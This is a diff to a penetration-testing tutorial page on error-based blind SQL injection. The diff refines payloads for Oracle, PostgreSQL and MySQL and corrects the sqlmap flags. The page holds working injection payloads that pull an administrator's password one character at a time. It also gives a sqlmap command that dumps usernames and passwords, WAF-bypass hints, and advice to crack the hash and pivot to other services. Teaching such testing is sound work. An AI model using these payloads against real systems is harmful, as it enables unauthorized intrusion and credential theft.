@@ -18,10 +18,12 @@ The query output isn't reflected, the response body is identical for true and fa
 
 ```sql
 -- Oracle: divide by zero only when the condition is TRUE → DB error
-' AND (SELECT CASE WHEN (<condition>) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)-- -
+' AND (SELECT CASE WHEN (<condition>) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NULL-- -
 ```
 
 If `<condition>` is true the query errors (HTTP 500, a custom error page, a stack trace); if false it returns normally. Everything else works like [boolean blind](../blind-boolean/) - binary-search each character - except the signal is "errored vs. didn't" instead of "content changed".
+
+The trailing `IS NULL` matters: it turns the scalar subquery into a valid boolean predicate for the `AND`. On the false branch the subquery returns `NULL`, `NULL IS NULL` is true, and the query runs normally; on the true branch the engine must evaluate `1/0` and raises. Without it, `AND <string-or-null>` is a type error that fails on *both* branches, giving you no oracle.
 
 ## When to use
 
@@ -52,17 +54,18 @@ On Oracle every `SELECT` needs a `FROM`, so `FROM dual` resolving the error is i
 
 ## Step 2 - Build the conditional error
 
-Pair a true/false condition with an expression that is only *evaluated* (and only errors) when the condition holds. Division by zero is the classic trigger.
+Pair a true/false condition with an expression that is only *evaluated* (and only errors) when the condition holds. Division by zero is the classic trigger. Use `1=1` to prove the error fires and `1=2` to prove it stops before plugging in a real condition.
 
 <Tabs syncKey="dbms">
   <TabItem label="Oracle">
     ```sql
-    ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)-- -
+    ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NULL-- -
     ```
   </TabItem>
   <TabItem label="PostgreSQL">
     ```sql
-    ' AND 1=(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS INT) ELSE 1 END)-- -
+    -- divisor is itself the CASE, so 1/0 can only be reached on the true branch
+    ' AND (SELECT 1/(CASE WHEN (1=1) THEN 0 ELSE 1 END)) IS NULL-- -
     ```
   </TabItem>
   <TabItem label="MSSQL">
@@ -72,41 +75,49 @@ Pair a true/false condition with an expression that is only *evaluated* (and onl
   </TabItem>
   <TabItem label="MySQL / MariaDB">
     ```sql
-    ' AND (SELECT IF(1=1, (SELECT table_name FROM information_schema.tables), 1))-- -
+    -- scalar subquery returns >1 row (error) only on the true branch
+    ' AND (SELECT CASE WHEN (1=1) THEN (SELECT table_name FROM information_schema.tables) ELSE NULL END) IS NULL-- -
     ```
   </TabItem>
 </Tabs>
 
-Swap `1=1` for `1=2` and the error must disappear. If both error or neither does, the trigger expression is being evaluated regardless of the condition - rework it so the erroring branch sits inside the `THEN`.
+Swap `1=1` for `1=2` and the error must disappear. If it fires on *both*, the trigger is being evaluated independently of the condition - see the first failure mode below.
+
+<Aside type="caution">
+PostgreSQL folds constant expressions at planning time, so a bare `CASE WHEN … THEN 1/0` can raise before the condition is ever checked - both branches error and you get no oracle. The fix above makes the **divisor** depend on the `CASE` (`1/(CASE … END)`), so `1/0` is only reachable when the true branch is chosen at execution. Once the condition references table data (Step 3) it can't be folded anyway.
+</Aside>
 
 ## Step 3 - Extract character by character
 
-Replace the constant condition with a substring comparison, exactly as in [boolean blind](../blind-boolean/) - only the oracle changes from "content differs" to "errored":
+Replace the constant condition with a substring comparison, exactly as in [boolean blind](../blind-boolean/) - keep the same conditional-error wrapper, only the condition changes:
 
 ```sql
 ' AND (SELECT CASE WHEN
   (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a')
-  THEN TO_CHAR(1/0) ELSE NULL END FROM dual)-- -
+  THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NULL-- -
 ```
 
-Error present → the character matches. Binary-search with `>`/`<` on `ASCII()`/`ORD()` to cut requests per character from ~94 to ~7, same algorithm as the boolean page.
+Error present → the character matches. Binary-search with `>`/`<` on `ASCII()`/`ORD()` to cut requests per character from ~94 to ~7, same algorithm as the boolean page. The data-dependent condition also sidesteps the PostgreSQL constant-folding problem, since the planner can't evaluate a per-row comparison ahead of time.
 
 ## Automation
 
-`sqlmap` detects and uses this technique automatically; restrict to it with `--technique=E`:
+To sqlmap this is a **boolean-blind** oracle - the error state is just its "true" response signature - so use `--technique=B`, not `E`. (sqlmap's `E` is *error-based extraction*, which scrapes data out of printed error-message text, a different technique covered under [UNION-based](../union-based/).) Point it at a reliable true/false matcher:
 
 ```bash
 sqlmap -u "https://<TARGET>/page" --cookie="TrackingId=xyz*" \
-  --technique=E --dbms=oracle --dump -T users -C username,password
+  --technique=B --string="Internal Server Error" \
+  --dbms=oracle --dump -T users -C username,password
 ```
 
-For manual control, the boolean-blind [ffuf and bash loops](../blind-boolean/#automation-with-ffuf) work unchanged - match on the error instead of response size, e.g. `ffuf ... -mc 500` to keep only responses that errored.
+`--string` (or `--code=500`) tells sqlmap what the "true"/errored response looks like.
+
+For manual control you can reuse the boolean-blind [ffuf and bash loops](../blind-boolean/#automation-with-ffuf), but changing the match filter alone is not enough: those payloads compare a substring directly and produce a *content* difference, never an error. Swap the injected payload for the conditional-error wrapper above (so the comparison sits inside the `CASE`), then match on the error - e.g. `ffuf ... -mc 500`, or `-mr "error string"` when the error page returns 200.
 
 ## Common failure modes
 
-- **The error branch always fires.** Some engines evaluate both `CASE` branches during planning. Keep the erroring expression inside `THEN` and make the `ELSE` cheap (`NULL`, `1`); if that fails, move the trigger into a correlated subquery.
-- **Errors are swallowed.** If the app catches exceptions and returns 200 with a generic page, there's no oracle here - fall back to [time-based](../blind-time/).
-- **WAF blocks `1/0` or `CASE`.** See [Bypasses](../bypasses/); `CAST('x' AS INT)` or a subquery returning multiple rows (`(SELECT table_name FROM information_schema.tables)`) are alternative error triggers.
+- **The error fires on both `1=1` and `1=2`.** The trigger is being evaluated independently of the condition - on PostgreSQL this is constant folding (see the Step 2 caution; make the divisor depend on the `CASE`). On other engines, make sure the erroring expression is only *reachable* through the true branch, not computed alongside it.
+- **The app returns 200 with a generic error page.** That is not necessarily a dead end: if the error page differs from the normal response at all - different text, different length - that difference *is* your oracle, and you're really doing [boolean blind](../blind-boolean/) with the error page as the "true" state. Only fall back to [time-based](../blind-time/) when the errored and successful responses are genuinely indistinguishable.
+- **WAF blocks `1/0` or `CASE`.** See [Bypasses](../bypasses/); a subquery returning multiple rows (`(SELECT table_name FROM information_schema.tables)`) or a failing `CAST` are alternative error triggers.
 
 ## Notes
 
@@ -115,7 +126,7 @@ For manual control, the boolean-blind [ffuf and bash loops](../blind-boolean/#au
 
 ## Next move
 
-- **Error oracle confirmed** → automate with sqlmap `--technique=E`, or the boolean-blind scripts matched on status code
+- **Error oracle confirmed** → automate with sqlmap `--technique=B --string=` / `--code=500`, or the boolean-blind scripts with the conditional-error payload matched on status code
 - **Backend fingerprinted as Oracle via `FROM dual`** → use the [DBMS cheatsheet](/codex/web/sqli/dbms-cheatsheet/) for Oracle-specific schema queries (`all_tables`, `all_tab_columns`)
 - **No error oracle after all** → [Time-based blind](/codex/web/sqli/blind-time/), then [Out-of-band](/codex/web/sqli/out-of-band/) if timing is also unreliable
 - **Extracted an admin hash** → crack offline, then pivot to [MSSQL / WinRM / SSH](/codex/network/services/mssql/) on the same host
